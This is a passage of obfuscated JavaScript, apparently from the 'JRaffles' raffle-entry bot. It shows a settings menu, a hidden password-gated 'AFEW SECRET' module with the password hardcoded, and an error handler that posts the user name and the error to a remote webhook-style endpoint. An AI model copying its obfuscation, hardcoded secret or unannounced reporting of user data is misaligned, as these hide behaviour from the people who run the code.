                                                                    if (_0x3ec9fa == _0x58b779)
                                                                        return _0x1a81a9();
                                                                    console['clear'];
                                                                    var _0x4cedb9 = 0x0;
                                                                    for (var _0x3025af in _0x9a51aa) {
                                                                        if (_0x3ec9fa == _0x4cedb9) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x3025af + '\x20:'), _0x9a51aa[_0x3025af] = await _0x4267ae(), _0x80a504['writeFileSync']('../settings.json', JSON['stringify'](_0x9a51aa));
                                                                            break;
                                                                        } else
                                                                            _0x4cedb9++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0xbbd9dc(0xbb8), _0x1a81a9();
                                                                } else {
                                                                    if (_0x199de3[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x24fcf2(), _0x1a81a9();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x199de3[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x32f167 = await _0x3d2f92();
                                                                            _0x32f167 == 'ModuleVoorDeBoys' ? (await _0x2e0919(), await _0x327729(), await afewFunction(_0x2cd6ef[_0x56b4a4], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0xbbd9dc(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x1a81a9();
        } catch (_0x1dff02) {
            return console['log'](_0x1dff02), await _0xbbd9dc(0x3a98);
        }
}
;
_0x1f02d2('JRaffles\x20' + _0x198625), _0x24fcf2();
try {
    _0x59b557();
} catch (_0x2d7022) {
    var _0x573ac5 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x213f4d
            },
            {
                'name': 'Version',
                'value': '' + _0x198625
            },
            {
                'name': 'Error',
                'value': '' + _0x2d7022
            }
        ]
    }];
    const _0x59ab36 = { 'embeds': _0x573ac5 };
    _0x4236dd(_0x48c50b, _0x59ab36);
}